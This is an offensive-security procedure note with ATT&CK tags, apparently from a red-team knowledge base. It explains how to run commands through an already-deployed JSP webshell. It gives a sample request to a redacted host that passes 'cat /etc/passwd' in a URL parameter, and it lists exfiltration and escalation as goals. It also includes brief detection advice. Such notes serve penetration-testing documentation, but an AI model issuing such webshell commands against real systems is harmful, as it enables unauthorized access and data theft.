---
tags:
  - rce
  - webshell
type: procedure
tools:
  - '[[tools/Browser]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/get-webshell-execute-command]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Command-Line Interface]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: d4db86ed-5d15-4405-873a-abc0fdb764cc
created_at: '2025-12-13T09:00:33.619Z'
updated_at: '2025-12-13T09:00:33.619Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Execute Commands via Deployed Webshell

## Summary

This procedure accesses the deployed JSP webshell and executes arbitrary commands to achieve RCE.

## Description

By visiting the JSP URL and passing commands via the 'c' parameter, attackers can run system commands like reading files.

## Requirements

1. Deployed JSP in webroot
2. Browser or tool to access URL
3. Command to execute

## Defense

Defensive measures and detection strategies:

- Monitor for suspicious JSP access
- Remove unauthorized files from webroot

## Objectives

1. Achieve remote code execution
2. Exfiltrate data or escalate
3. Validate compromise

## Instructions

### Step 1: Access and Execute

**Context**: Call the webshell with command.

**Command** ([[commands/get-webshell-execute-command]]):
```bash
https://██████/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd
```

> This executes 'cat /etc/passwd' and returns output.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/get-webshell-execute-command]]

## Tools Used

- [[tools/Browser]]

## Tags

- rce
- webshell
